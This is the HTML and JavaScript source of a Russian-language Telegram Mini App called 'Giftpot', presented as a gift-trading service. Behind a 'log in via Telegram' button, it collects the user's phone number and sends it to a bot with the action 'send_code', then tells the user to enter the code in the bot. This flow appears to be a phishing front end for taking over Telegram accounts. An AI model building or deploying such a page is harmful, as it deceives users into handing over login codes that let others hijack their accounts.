<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Giftpot - Trade & Safe</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%);
        }
        
        .container {
            background: white;
            border-radius: 24px;
            padding: 40px 32px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        
        .mascot {
            width: 120px;
            height: 120px;
            margin: 0 auto 24px;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 8px;
            color: #1e293b;
        }
        
        .subtitle {
            color: #64748b;
            margin-bottom: 32px;
            font-size: 14px;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: #3b82f6;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn:active {
            transform: scale(0.98);
        }
        
        .btn:disabled {
            background: #cbd5e1;
            cursor: not-allowed;
        }
        
        .btn-secondary {
            background: #94a3b8;
            margin-top: 12px;
        }
        
        .step {
            display: none;
        }
        
        .step.active {
            display: block;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .loader {
            width: 48px;
            height: 48px;
            border: 4px solid rgba(59, 130, 246, 0.2);
            border-top-color: #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 24px auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .phone-input {
            width: 100%;
            padding: 16px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 16px;
            margin-bottom: 16px;
        }

        .phone-input:focus {
            outline: none;
            border-color: #3b82f6;
        }

        .debug {
            margin-top: 16px;
            padding: 12px;
            background: #f1f5f9;
            border-radius: 8px;
            font-size: 12px;
            color: #475569;
            text-align: left;
            max-height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Welcome Step -->
        <div id="welcome-step" class="step active">
            <svg class="mascot" viewBox="0 0 200 200">
                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
                <circle cx="75" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
                <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
                <circle cx="75" cy="70" r="10" fill="black"/>
                <circle cx="125" cy="70" r="10" fill="black"/>
            </svg>
            
            <h1>Giftpot</h1>
            <p class="subtitle">Здесь начинается мир продажи и обмена подарками</p>
            
            <button class="btn" id="login-btn" onclick="showPhoneStep()">
                Войти через Telegram
            </button>
            
            <div id="debug-info" class="debug" style="display: none;"></div>
        </div>

        <!-- Phone Input Step -->
        <div id="phone-step" class="step">
            <svg class="mascot" viewBox="0 0 200 200">
                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
                <circle cx="75" cy="70" r="10" fill="black"/>
                <circle cx="125" cy="70" r="10" fill="black"/>
            </svg>
            
            <h1>Введите номер</h1>
            <p class="subtitle">Формат: +1234567890</p>
            
            <input 
                type="tel" 
                id="phone-input" 
                class="phone-input" 
                placeholder="+1234567890"
            />
            
            <button class="btn" onclick="submitPhone()">Продолжить</button>
            <button class="btn btn-secondary" onclick="showStep('welcome-step')">
                Назад
            </button>
        </div>

        <!-- Loading Step -->
        <div id="loading-step" class="step">
            <h1>Отправка...</h1>
            <div class="loader"></div>
            <p class="subtitle" id="loading-text">Подождите</p>
        </div>

        <!-- Success Step -->
        <div id="success-step" class="step">
            <div style="font-size: 64px; margin-bottom: 16px;">✅</div>
            <h1>Готово!</h1>
            <p class="subtitle">Проверьте бота для ввода кода</p>
        </div>

        <!-- Error Step -->
        <div id="error-step" class="step">
            <div style="font-size: 64px; margin-bottom: 16px;">❌</div>
            <h1>Ошибка</h1>
            <p class="subtitle" id="error-message">Что-то пошло не так</p>
            <button class="btn" onclick="showStep('welcome-step')">Попробовать снова</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        // Debug info
        const debugInfo = {
            version: tg.version,
            platform: tg.platform,
            user: tg.initDataUnsafe?.user,
            initData: tg.initData ? 'present' : 'missing'
        };
        
        document.getElementById('debug-info').textContent = JSON.stringify(debugInfo, null, 2);
        console.log('Telegram WebApp:', debugInfo);

        function showStep(stepId) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(stepId).classList.add('active');
        }

        function showPhoneStep() {
            showStep('phone-step');
            setTimeout(() => {
                document.getElementById('phone-input').focus();
            }, 300);
        }

        function showError(message) {
            document.getElementById('error-message').textContent = message;
            showStep('error-step');
        }

        function submitPhone() {
            const phoneInput = document.getElementById('phone-input');
            let phone = phoneInput.value.trim();

            if (!phone) {
                alert('Введите номер телефона');
                return;
            }

            if (!phone.startsWith('+')) {
                phone = '+' + phone;
            }

            if (!/^\+?[0-9]{10,15}$/.test(phone)) {
                alert('Неверный формат. Пример: +1234567890');
                return;
            }

            sendPhoneToBot(phone);
        }

        function sendPhoneToBot(phone) {
            showStep('loading-step');
            document.getElementById('loading-text').textContent = 'Отправка номера...';

            const data = JSON.stringify({
                action: 'send_code',
                phone: phone
            });

            console.log('Sending data to bot:', data);

            try {
                tg.sendData(data);
                
                // Показываем успех
                setTimeout(() => {
                    showStep('success-step');
                    
                    // Закрываем через 2 секунды
                    setTimeout(() => {
                        tg.close();
                    }, 2000);
                }, 500);
            } catch (error) {
                console.error('Error sending data:', error);
                showError('Ошибка отправки: ' + error.message);
            }
        }

        // Показать debug info при долгом нажатии на заголовок
        let pressTimer;
        document.querySelector('h1').addEventListener('touchstart', () => {
            pressTimer = setTimeout(() => {
                const debug = document.getElementById('debug-info');
                debug.style.display = debug.style.display === 'none' ? 'block' : 'none';
            }, 2000);
        });
        document.querySelector('h1').addEventListener('touchend', () => {
            clearTimeout(pressTimer);
        });
    </script>
</body>
</html>
